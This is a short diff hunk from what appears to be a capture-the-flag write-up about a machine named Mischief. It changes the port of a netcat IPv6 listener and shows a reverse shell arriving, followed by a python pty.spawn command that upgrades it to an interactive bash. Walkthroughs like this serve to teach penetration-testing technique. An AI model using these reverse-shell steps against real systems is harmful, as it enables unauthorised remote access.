@@ -221,8 +221,8 @@ We do not have to put the IPV6 address of the machine, but the loopback address 
     
 AND BIM REVERSE SHELL ! :D
 
-    loki@Mischief:~$ nc -6 -lvp 7984
-    Listening on [::] (family 10, port 7984)
+    loki@Mischief:~$ nc -6 -lvp 4567
+    Listening on [::] (family 10, port 4567)
     Connection from localhost6.localdomain6 46886 received!
     /bin/sh: 0: can't access tty; job control turned off
     $ python -c "import pty;pty.spawn('/bin/bash')"
